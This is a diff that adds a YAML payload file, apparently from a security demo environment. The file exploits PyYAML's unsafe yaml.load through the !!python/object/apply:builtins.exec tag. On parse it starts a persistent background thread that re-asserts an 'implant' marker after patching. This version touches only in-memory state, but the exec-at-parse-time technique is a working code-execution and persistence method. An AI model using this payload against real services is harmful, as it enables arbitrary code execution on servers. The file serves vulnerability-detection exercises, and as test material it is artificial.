@@ -1,0 +1,61 @@
+# payload-a.yaml — "thread-beacon" variant
+#
+# Exploits the real, historical PyYAML arbitrary-code-execution issue: when a
+# server calls yaml.load(raw, Loader=yaml.Loader) (or plain yaml.load() on old
+# PyYAML) on attacker-controlled text, the !!python/object/apply: tag lets the
+# YAML document name ANY importable Python callable and invoke it with
+# attacker-chosen arguments at parse time. Here we point it at the builtin
+# `exec` and hand it a short string of Python source as the single argument,
+# which is then executed inside the Flask worker process when this document
+# is parsed.
+#
+# INERT / SAFE BY DESIGN:
+#   - No network I/O, no subprocess, no file access outside the running
+#     process's own memory.
+#   - Only touches the `STATE` dict that already lives in app.py's __main__
+#     module — nothing else on disk or in the environment is read or changed.
+#   - The background thread only sleeps and writes to that one in-memory
+#     dict; it is a daemon thread, so it dies automatically when the process
+#     exits, and it is started exactly once per /ingest call.
+#   - This file exists purely so a live demo can discover and patch a real
+#     vulnerability class; it is not usable against any other system.
+#
+# Behavior: starts a daemon thread that re-asserts the implant marker once a
+# second, forever (until the process restarts). This is deliberately
+# different from payload-b.yaml: calling /_debug/patch flips
+# STATE["implant_present"] back to False for an instant, but this variant's
+# background thread will flip it back to True on its next tick — modeling an
+# implant that *survives* patching the entry point and needs a full process
+# restart to truly clear. /_debug/state will also show a growing
+# "implant_heartbeat" counter that payload-b.yaml never produces, so an agent
+# polling /_debug/state over a couple of seconds can tell the two variants
+# apart without being told which one ran.
+
+!!python/object/apply:builtins.exec
+args:
+  - |
+    import sys, threading, time
+
+    _m = sys.modules.get('__main__')
+    if _m is not None and not getattr(_m, '_rehearsal_variant_a_started', False):
+        _m._rehearsal_variant_a_started = True
+
+        def _beacon():
+            while True:
+                try:
+                    _m.STATE['implant_present'] = True
+                    _m.STATE['implant_marker'] = 'variant-A-thread-beacon'
+                    _m.STATE['implant_heartbeat'] = _m.STATE.get('implant_heartbeat', 0) + 1
+                except Exception:
+                    pass
+                time.sleep(1)
+
+        threading.Thread(target=_beacon, daemon=True, name='rehearsal-demo-implant-a').start()
+  - {}
+# ^ the second `args` item is an explicit (empty) globals dict for exec().
+# Without it, exec(code_string) runs with the *caller's* locals/globals split,
+# and a nested `def` inside the string captures the wrong globals dict —
+# causing a spurious NameError the first time the thread calls time.sleep().
+# Passing an explicit dict keeps imports and the function definition in the
+# same namespace, which is what makes the background thread actually work.
+
